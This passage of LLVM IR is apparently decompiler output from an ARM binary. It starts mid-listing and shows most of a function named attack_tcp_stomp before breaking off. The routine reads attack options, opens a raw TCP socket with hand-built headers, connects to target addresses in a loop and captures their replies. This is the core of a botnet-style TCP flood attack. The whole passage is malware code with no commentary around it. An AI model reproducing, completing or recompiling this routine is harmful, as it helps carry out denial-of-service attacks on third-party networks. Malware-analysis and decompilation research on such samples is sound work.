  uselistorder i32 %v3_9ad0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_9abc, { 2, 3, 1, 0 }
  uselistorder i32 %v6_9a9c, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_9a84, { 1, 2, 0 }
  uselistorder i32 %v1_9a64, { 1, 2, 0 }
  uselistorder i32 %v1_9a44, { 1, 2, 0 }
  uselistorder i32 %v1_9a24, { 1, 2, 0 }
  uselistorder i32 %v1_9a04, { 1, 2, 0 }
  uselistorder i32 %v1_99e4, { 1, 2, 0 }
  uselistorder i32 %v6_99c0, { 1, 0 }
  uselistorder i32 %v1_99a8, { 1, 2, 0 }
  uselistorder i32 %v6_9940, { 2, 1, 3, 0 }
  uselistorder i32 %v2_9928, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v2_9918, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9fa4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9f78, { 1, 0 }
  uselistorder label %dec_label_pc_9f68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9f58, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_9cc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9c94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9bd0, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_9bb0, { 1, 0 }
  uselistorder label %dec_label_pc_9b8c, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_9b3c, { 1, 0 }
  uselistorder label %dec_label_pc_9b20, { 1, 0 }
}

define i32 @attack_tcp_stomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_a0b0 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_a0cc = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_a0d8 = load i32, i32* @r6, align 4
  store i32 %v0_a0d8, i32* %r0.global-to-local, align 4
  %v2_a0dc = call i32 @calloc(i32 %v0_a0d8, i32 4)
  %v0_a0e0 = load i32, i32* @r5, align 4
  store i32 %v0_a0e0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a0f0 = load i32, i32* @r4, align 4
  store i32 %v0_a0f0, i32* %r0.global-to-local, align 4
  %v5_a0f4 = inttoptr i32 %v0_a0e0 to i32*
  %v6_a0f4 = call i32 @attack_get_opt_int(i32 %v0_a0f0, i32* %v5_a0f4, i32 2, i32 0, i32 %v2_a0dc)
  %v1_a100 = urem i32 %v6_a0f4, 256
  store i32 %v1_a100, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a10c = load i32, i32* @r5, align 4
  store i32 %v0_a10c, i32* %r1.global-to-local, align 4
  %v0_a110 = load i32, i32* @r4, align 4
  store i32 %v0_a110, i32* %r0.global-to-local, align 4
  %v5_a114 = trunc i32 %v6_a0f4 to i8
  %v6_a118 = inttoptr i32 %v0_a10c to i32*
  %v7_a118 = call i32 @attack_get_opt_int(i32 %v0_a110, i32* %v6_a118, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v6_a0f4)
  %v0_a11c = load i32, i32* @r5, align 4
  store i32 %v0_a11c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a118, i32* @r7, align 4
  %v0_a12c = load i32, i32* @r4, align 4
  store i32 %v0_a12c, i32* %r0.global-to-local, align 4
  %v5_a130 = inttoptr i32 %v0_a11c to i32*
  %v6_a130 = call i32 @attack_get_opt_int(i32 %v0_a12c, i32* %v5_a130, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_a138 = urem i32 %v6_a130, 256
  store i32 %v1_a138, i32* %ip.global-to-local, align 4
  %v0_a13c = load i32, i32* @r5, align 4
  store i32 %v0_a13c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a148 = load i32, i32* @r4, align 4
  store i32 %v0_a148, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_a130, 16777216
  %v5_a150 = sdiv i32 %sext, 16777216
  %v6_a150 = inttoptr i32 %v0_a13c to i32*
  %v7_a150 = call i32 @attack_get_opt_int(i32 %v0_a148, i32* %v6_a150, i32 5, i32 1, i32 %v5_a150)
  %v1_a15c = urem i32 %v7_a150, 256
  store i32 %v1_a15c, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  %v0_a164 = load i32, i32* @r5, align 4
  store i32 %v0_a164, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a16c = load i32, i32* @r4, align 4
  store i32 %v0_a16c, i32* %r0.global-to-local, align 4
  %v5_a174 = inttoptr i32 %v0_a164 to i32*
  %v6_a174 = call i32 @attack_get_opt_int(i32 %v0_a16c, i32* %v5_a174, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v1_a15c)
  %v0_a178 = load i32, i32* @r5, align 4
  store i32 %v0_a178, i32* %r1.global-to-local, align 4
  %v3_a17c = mul i32 %v6_a174, 65536
  store i32 %v3_a17c, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a188 = load i32, i32* @r4, align 4
  store i32 %v0_a188, i32* %r0.global-to-local, align 4
  %v3_a18c = urem i32 %v6_a174, 65536
  store i32 %v3_a18c, i32* @sl, align 4
  %v5_a190 = inttoptr i32 %v0_a178 to i32*
  %v6_a190 = call i32 @attack_get_opt_int(i32 %v0_a188, i32* %v5_a190, i32 11, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v1_a198 = urem i32 %v6_a190, 256
  store i32 %v1_a198, i32* %ip.global-to-local, align 4
  %v0_a19c = load i32, i32* @r5, align 4
  store i32 %v0_a19c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a1a8 = load i32, i32* @r4, align 4
  store i32 %v0_a1a8, i32* %r0.global-to-local, align 4
  %v5_a1b0 = inttoptr i32 %v0_a19c to i32*
  %v6_a1b0 = call i32 @attack_get_opt_int(i32 %v0_a1a8, i32* %v5_a1b0, i32 12, i32 1, i32 %v1_a198)
  %v1_a1b8 = urem i32 %v6_a1b0, 256
  store i32 %v1_a1b8, i32* %ip.global-to-local, align 4
  %v0_a1bc = load i32, i32* @r5, align 4
  store i32 %v0_a1bc, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a1c8 = load i32, i32* @r4, align 4
  store i32 %v0_a1c8, i32* %r0.global-to-local, align 4
  %v5_a1d0 = inttoptr i32 %v0_a1bc to i32*
  %v6_a1d0 = call i32 @attack_get_opt_int(i32 %v0_a1c8, i32* %v5_a1d0, i32 13, i32 1, i32 %v1_a1b8)
  %v1_a1d8 = urem i32 %v6_a1d0, 256
  store i32 %v1_a1d8, i32* %ip.global-to-local, align 4
  %v0_a1dc = load i32, i32* @r5, align 4
  store i32 %v0_a1dc, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a1e8 = load i32, i32* @r4, align 4
  store i32 %v0_a1e8, i32* %r0.global-to-local, align 4
  %v5_a1f0 = inttoptr i32 %v0_a1dc to i32*
  %v6_a1f0 = call i32 @attack_get_opt_int(i32 %v0_a1e8, i32* %v5_a1f0, i32 14, i32 0, i32 %v1_a1d8)
  %v1_a1f8 = urem i32 %v6_a1f0, 256
  store i32 %v1_a1f8, i32* %ip.global-to-local, align 4
  %v0_a1fc = load i32, i32* @r5, align 4
  store i32 %v0_a1fc, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a208 = load i32, i32* @r4, align 4
  store i32 %v0_a208, i32* %r0.global-to-local, align 4
  %v5_a210 = inttoptr i32 %v0_a1fc to i32*
  %v6_a210 = call i32 @attack_get_opt_int(i32 %v0_a208, i32* %v5_a210, i32 15, i32 0, i32 %v1_a1f8)
  %v1_a218 = urem i32 %v6_a210, 256
  store i32 %v1_a218, i32* %ip.global-to-local, align 4
  %v0_a21c = load i32, i32* @r5, align 4
  store i32 %v0_a21c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a228 = load i32, i32* @r4, align 4
  store i32 %v0_a228, i32* %r0.global-to-local, align 4
  %v5_a230 = inttoptr i32 %v0_a21c to i32*
  %v6_a230 = call i32 @attack_get_opt_int(i32 %v0_a228, i32* %v5_a230, i32 16, i32 0, i32 %v1_a218)
  %v1_a238 = urem i32 %v6_a230, 256
  store i32 %v1_a238, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_a244 = load i32, i32* @r5, align 4
  store i32 %v0_a244, i32* %r1.global-to-local, align 4
  %v0_a248 = load i32, i32* @r4, align 4
  store i32 %v0_a248, i32* %r0.global-to-local, align 4
  %v5_a250 = inttoptr i32 %v0_a244 to i32*
  %v6_a250 = call i32 @attack_get_opt_int(i32 %v0_a248, i32* %v5_a250, i32 0, i32 768, i32 %v1_a238)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a260 = load i32, i32* @r5, align 4
  store i32 %v0_a260, i32* %r1.global-to-local, align 4
  %v0_a264 = load i32, i32* @r4, align 4
  store i32 %v0_a264, i32* %r0.global-to-local, align 4
  %v5_a268 = inttoptr i32 %v0_a260 to i32*
  %v6_a268 = call i32 @attack_get_opt_int(i32 %v0_a264, i32* %v5_a268, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_a270 = urem i32 %v6_a268, 256
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_a284 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_a284, i32* %r0.global-to-local, align 4
  %v7_a288 = icmp eq i32 %v3_a284, -1
  store i1 %v7_a288, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a284, i32* @sb, align 4
  br i1 %v7_a288, label %dec_label_pc_a478, label %dec_label_pc_a294

dec_label_pc_a294:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a29c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a29c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a2b0 = call i32 @__GI_setsockopt(i32 %v3_a284, i32 0, i32 3, i32 %v6_a29c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_a2b0, i32* %r0.global-to-local, align 4
  %v7_a2b4 = icmp eq i32 %v5_a2b0, -1
  store i1 %v7_a2b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a2b4, label %dec_label_pc_a470, label %dec_label_pc_a2bc

dec_label_pc_a2bc:                                ; preds = %dec_label_pc_a294
  %v0_a2bc = load i32, i32* @r7, align 4
  %v3_a2bc = mul i32 %v0_a2bc, 65536
  store i32 %v3_a2bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_a2c4 = load i32, i32* @r6, align 4
  %v2_a2c4 = icmp eq i32 %v0_a2c4, 0
  store i1 %v2_a2c4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_a2cc = urem i32 %v0_a2bc, 65536
  store i32 %v3_a2cc, i32* @fp, align 4
  br i1 %v2_a2c4, label %dec_label_pc_a6fc, label %dec_label_pc_a2d4.preheader

dec_label_pc_a2d4.preheader:                      ; preds = %dec_label_pc_a2bc
  %v2_a320 = ptrtoint i32* %stack_var_-144 to i32
  %v2_a364 = ptrtoint i32* %stack_var_-64 to i32
  %v2_a39c = ptrtoint i32* %stack_var_-80 to i32
  %v2_a3a8 = ptrtoint i32* %stack_var_-336 to i32
  %v2_a3ac = ptrtoint i32* %stack_var_-48 to i32
  %v4_a40c = zext i8 %tmp to i32
  %v1_a410 = and i32 %v4_a40c, 18
  %v2_a414 = icmp eq i32 %v1_a410, 18
  %v3_a3f8 = sext i16 %tmp61 to i32
  %v1_a41c = and i32 %v4_a40c, 5
  %v2_a41c = icmp eq i32 %v1_a41c, 0
  %v4_a35c = add i32 %v2_a320, 82
  %v5_a35c = inttoptr i32 %v4_a35c to i16*
  %v1_a54c = add i32 %v6_a250, 40
  %v1_a660 = urem i32 %v6_a190, 2
  %tmp95 = sub nsw i32 0, %v1_a660
  %v4_a668 = and i32 %tmp95, 32
  %v1_a678 = urem i32 %v6_a1b0, 2
  %tmp96 = sub nsw i32 0, %v1_a678
  %v4_a680 = and i32 %tmp96, 16
  %v1_a690 = urem i32 %v6_a1d0, 2
  %tmp97 = sub nsw i32 0, %v1_a690
  %v4_a698 = and i32 %tmp97, 8
  %v1_a6a8 = urem i32 %v6_a1f0, 2
  %tmp98 = sub nsw i32 0, %v1_a6a8
  %v4_a6b0 = and i32 %tmp98, 4
  %v1_a6c0 = urem i32 %v6_a210, 2
  %tmp99 = sub nsw i32 0, %v1_a6c0
  %v3_a6c8 = and i32 %tmp99, 2
  %v1_a6d8 = urem i32 %v6_a230, 2
  br label %dec_label_pc_a2d4

dec_label_pc_a2d4:                                ; preds = %dec_label_pc_a2d4.preheader, %dec_label_pc_a448
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_a448 ], [ %tmp34, %dec_label_pc_a2d4.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_a448 ], [ %tmp37, %dec_label_pc_a2d4.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a2e0 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_a2e0, i32* %r0.global-to-local, align 4
  %v7_a2e4 = icmp eq i32 %v3_a2e0, -1
  store i1 %v7_a2e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a2e0, i32* @r5, align 4
  br i1 %v7_a2e4, label %dec_label_pc_a448, label %dec_label_pc_a2f0

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_a2d4, %dec_label_pc_a424
  %v0_a2f8 = phi i32 [ %v3_a438, %dec_label_pc_a424 ], [ %v3_a2e0, %dec_label_pc_a2d4 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_a424 ], [ %stack_var_-62.0, %dec_label_pc_a2d4 ]
  %stack_var_-60.1 = phi i32 [ %v0_a4f8, %dec_label_pc_a424 ], [ %stack_var_-60.0, %dec_label_pc_a2d4 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_a2f8 = call i32 @__libc_fcntl(i32 %v0_a2f8, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_a300 = or i32 %v2_a2f8, 2048
  store i32 %v1_a300, i32* @r2, align 4
  %v0_a304 = load i32, i32* @r5, align 4
  store i32 %v0_a304, i32* %r0.global-to-local, align 4
  %v2_a308 = call i32 @__libc_fcntl(i32 %v0_a304, i32 4)
  %v3_a30c = load i32, i32* %stack_var_-44, align 4
  %v5_a314 = mul i32 %v3_a30c, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_a320, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_a328 = add i32 %v5_a314, %arg2
  store i32 %v2_a328, i32* %r3.global-to-local, align 4
  %v1_a32c = add i32 %v2_a328, 20
  %v2_a32c = inttoptr i32 %v1_a32c to i8*
  %v3_a32c = load i8, i8* %v2_a32c, align 1
  %v4_a32c = zext i8 %v3_a32c to i32
  store i32 %v4_a32c, i32* %r2.global-to-local, align 4
  %v2_a330 = icmp ugt i8 %v3_a32c, 30
  %v7_a330 = icmp eq i8 %v3_a32c, 31
  store i1 %v7_a330, i1* %cpsr_z.global-to-local, align 1
  %v2_a334 = xor i1 %v7_a330, true
  %v3_a334 = and i1 %v2_a330, %v2_a334
  br i1 %v3_a334, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_a2f0
  %v5_a334 = add i32 %v2_a328, 16
  %v6_a334 = inttoptr i32 %v5_a334 to i32*
  %v7_a334 = load i32, i32* %v6_a334, align 4
  store i32 %v7_a334, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_a2f0, %bb
  %v4_a338 = phi i32 [ %v2_a328, %dec_label_pc_a2f0 ], [ %v7_a334, %bb ]
  %v4_a338.stack_var_-60.1 = select i1 %v3_a334, i32 %v4_a338, i32 %stack_var_-60.1
  %v2_a33c = xor i1 %v2_a330, true
  %v3_a33c = or i1 %v7_a330, %v2_a33c
  br i1 %v3_a33c, label %dec_label_pc_a484, label %dec_label_pc_a340

dec_label_pc_a340:                                ; preds = %bb71, %dec_label_pc_a484
  %v0_a4f8 = phi i32 [ %v5_a4d4, %dec_label_pc_a484 ], [ %v4_a338.stack_var_-60.1, %bb71 ]
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  %v0_a348 = load i32, i32* @sl, align 4
  %v9_a348 = icmp eq i32 %v0_a348, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  store i1 %v9_a348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a348, label %dec_label_pc_a4e0, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_a340
  %v4_a34c = udiv i32 %v0_a348, 256
  %v2_a350 = urem i32 %v0_a348, 256
  store i32 %v2_a350, i32* %r2.global-to-local, align 4
  %v5_a354 = mul nuw nsw i32 %v2_a350, 256
  %v6_a354 = or i32 %v5_a354, %v4_a34c
  store i32 %v6_a354, i32* %r3.global-to-local, align 4
  store i32 %v2_a320, i32* %r0.global-to-local, align 4
  %v2_a35c = trunc i32 %v6_a354 to i16
  store i16 %v2_a35c, i16* %v5_a35c, align 2
  br label %dec_label_pc_a364

dec_label_pc_a364:                                ; preds = %.thread9, %dec_label_pc_a4e0
  %stack_var_-62.2 = phi i16 [ %v1_a4e0, %dec_label_pc_a4e0 ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_a364, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_a36c = load i32, i32* @r5, align 4
  store i32 %v0_a36c, i32* %r0.global-to-local, align 4
  %v3_a370 = call i32 @__libc_connect(i32 %v0_a36c, i32 %v2_a364, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_a378 = call i32 @__GI_time(i32* null)
  store i32 %v2_a378, i32* %r0.global-to-local, align 4
  store i32 %v2_a378, i32* @r4, align 4
  %v9_a3d8 = icmp eq i32 %tmp35, %v0_a4f8
  %v4_a400 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_a3d8 to i32
  %v9_a3ec = icmp eq i1 %v9_a3d8, false
  %v9_a404 = icmp eq i32 %v3_a3f8, %v4_a400
  br label %dec_label_pc_a394

dec_label_pc_a384:                                ; preds = %.thread, %dec_label_pc_a3f4, %dec_label_pc_a41c, %bb74
  %v2_a384 = call i32 @__GI_time(i32* null)
  %v0_a388 = load i32, i32* @r4, align 4
  %v2_a388 = sub i32 %v2_a384, %v0_a388
  store i32 %v2_a388, i32* %r0.global-to-local, align 4
  %v7_a38c = icmp eq i32 %v2_a388, 10
  store i1 %v7_a38c, i1* %cpsr_z.global-to-local, align 1
  %v8_a390 = icmp sgt i32 %v2_a388, 10
  br i1 %v8_a390, label %dec_label_pc_a424, label %dec_label_pc_a394

dec_label_pc_a394:                                ; preds = %dec_label_pc_a384, %dec_label_pc_a364
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_a3a8, i32* %r1.global-to-local, align 4
  store i32 %v2_a3ac, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a3b4 = load i32, i32* @sb, align 4
  store i32 %v0_a3b4, i32* %r0.global-to-local, align 4
  %v6_a3bc = call i32 @__libc_recvfrom(i32 %v0_a3b4, i32 %v2_a3a8, i32 256, i32 16384, i32 %v2_a39c, i32 %v2_a3ac)
  store i32 %v6_a3bc, i32* %r2.global-to-local, align 4
  %v7_a3c4 = icmp eq i32 %v6_a3bc, -1
  store i1 %v7_a3c4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_a3c4, label %dec_label_pc_a478, label %dec_label_pc_a3d0

dec_label_pc_a3d0:                                ; preds = %dec_label_pc_a394
  store i32 %v0_a4f8, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_a3e4 = icmp eq i32 %v6_a3bc, 40
  store i1 %v7_a3e4, i1* %cpsr_z.global-to-local, align 1
  %tmp100 = icmp ult i32 %v6_a3bc, 41
  br i1 %tmp100, label %.thread, label %bb74

.thread:                                          ; preds = %dec_label_pc_a3d0
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_a384

bb74:                                             ; preds = %dec_label_pc_a3d0
  store i1 %v9_a3ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a3ec, label %dec_label_pc_a384, label %dec_label_pc_a3f4

dec_label_pc_a3f4:                                ; preds = %bb74
  store i32 %v3_a3f8, i32* @lr, align 4
  store i32 %v2_a320, i32* @r3, align 4
  store i32 %v4_a400, i32* %r2.global-to-local, align 4
  store i1 %v9_a404, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a404, label %dec_label_pc_a40c, label %dec_label_pc_a384

dec_label_pc_a40c:                                ; preds = %dec_label_pc_a3f4
  store i32 %v4_a40c, i32* %r2.global-to-local, align 4
  store i32 %v1_a410, i32* @r3, align 4
  store i1 %v2_a414, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a414, label %dec_label_pc_a4f0, label %dec_label_pc_a41c

dec_label_pc_a41c:                                ; preds = %dec_label_pc_a40c
  store i1 %v2_a41c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a41c, label %dec_label_pc_a384, label %dec_label_pc_a424

dec_label_pc_a424:                                ; preds = %dec_label_pc_a41c, %dec_label_pc_a384
  %v0_a424 = load i32, i32* @r5, align 4
  store i32 %v0_a424, i32* %r0.global-to-local, align 4
  %v1_a428 = call i32 @__GI___libc_close(i32 %v0_a424)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a438 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_a438, i32* %r0.global-to-local, align 4
  %v3_a43c = icmp eq i32 %v3_a438, -1
  %v8_a43c = icmp eq i32 %v3_a438, -1
  store i1 %v8_a43c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a438, i32* @r5, align 4
  br i1 %v3_a43c, label %dec_label_pc_a448, label %dec_label_pc_a2f0

dec_label_pc_a448:                                ; preds = %dec_label_pc_a424, %dec_label_pc_a2d4, %bb81
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_a2d4 ], [ %stack_var_-62.2, %bb81 ], [ %stack_var_-62.2, %dec_label_pc_a424 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_a2d4 ], [ %v0_a4f8, %bb81 ], [ %v0_a4f8, %dec_label_pc_a424 ]
  %v3_a448 = load i32, i32* %stack_var_-44, align 4
  %v1_a44c = add i32 %v3_a448, 1
  store i32 %v1_a44c, i32* @r3, align 4
  %v1_a450 = load i32, i32* @r6, align 4
  %v9_a450 = icmp eq i32 %v1_a44c, %v1_a450
  store i1 %v9_a450, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a44c, i32* %stack_var_-44, align 4
  %v5_a458 = icmp slt i32 %v1_a44c, %v1_a450
  br i1 %v5_a458, label %dec_label_pc_a2d4, label %dec_label_pc_a45c

dec_label_pc_a45c:                                ; preds = %dec_label_pc_a448
  store i32 %v6_a250, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a70c

dec_label_pc_a470:                                ; preds = %dec_label_pc_a294
  %v0_a470 = load i32, i32* @sb, align 4
  store i32 %v0_a470, i32* %r0.global-to-local, align 4
  %v1_a474 = call i32 @__GI___libc_close(i32 %v0_a470)
  store i32 %v1_a474, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a478

dec_label_pc_a478:                                ; preds = %dec_label_pc_a394, %entry, %dec_label_pc_a470
  %v1_a480 = phi i32 [ %v3_a284, %entry ], [ %v1_a474, %dec_label_pc_a470 ], [ 0, %dec_label_pc_a394 ]
  store i32 %v27_a0b0, i32* %lr.global-to-local, align 4
  ret i32 %v1_a480

dec_label_pc_a484:                                ; preds = %bb71
  %v1_a484 = add i32 %v4_a338, 16
  %v2_a484 = inttoptr i32 %v1_a484 to i32*
  %v3_a484 = load i32, i32* %v2_a484, align 4
  store i32 %v3_a484, i32* @r4, align 4
  %v0_a488 = call i32 @rand_next()
  store i32 %v0_a488, i32* %r0.global-to-local, align 4
